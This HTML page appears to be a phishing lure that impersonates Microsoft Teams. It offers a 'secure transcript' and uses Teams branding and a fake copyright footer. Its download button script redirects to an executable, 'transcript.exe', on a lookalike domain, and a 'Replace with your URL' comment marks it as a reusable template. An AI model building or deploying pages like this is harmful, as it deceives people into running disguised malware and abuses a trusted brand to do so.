<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your Secure - Transcript</title>

  <!-- Link to External CSS -->
  <link rel="stylesheet" href="styles.css">

  <!-- Add Font Awesome CDN with Subresource Integrity (SRI) for security -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-oP0nBlge8ACh/zoIsE6Vu6/J9CgXzfyNKf5Xj/XAOT+nwsXK+9Mh5iKGeJdofBw7" crossorigin="anonymous">

  <!-- Content Security Policy (CSP) -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self'; object-src 'none';">

  <style>
    .spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 4px solid transparent;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      position: relative;
    }

    .container {
      text-align: center;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="logo.png" alt="Teams Logo">
      <h1>Transcript Access</h1>
    </div>

    <div class="icon-secure">
      <img src="line.png" alt="Lock Icon">
    </div>
    <p class="message">Your transcript is securely waiting for you.</p>
    
    <button class="button" id="downloadButton">
      <div class="spinner" id="spinner"></div>
      <span id="buttonText">Download Transcript</span>
    </button>

    <div class="footer">
      <a href="https://www.microsoft.com/en/microsoft-teams/download-app" target="_blank" class="install-link">Download Microsoft Teams to stay connected</a>
      <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Support</a></p>
      <p>&copy; 2025 Microsoft Teams</p>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('downloadButton').onclick = function() {
        console.log('Button clicked!');
        
        const spinner = document.getElementById('spinner');
        const buttonText = document.getElementById('buttonText');
        
        spinner.style.display = 'inline-block';
        buttonText.textContent = 'Loading...';

        setTimeout(function() {
          console.log('Redirecting...');
          window.location.href = 'https://transcriptss.cfd/vt/transcript.exe'; // Replace with your URL
        }, 2000);
      };
    });
  </script>
</body>
</html>
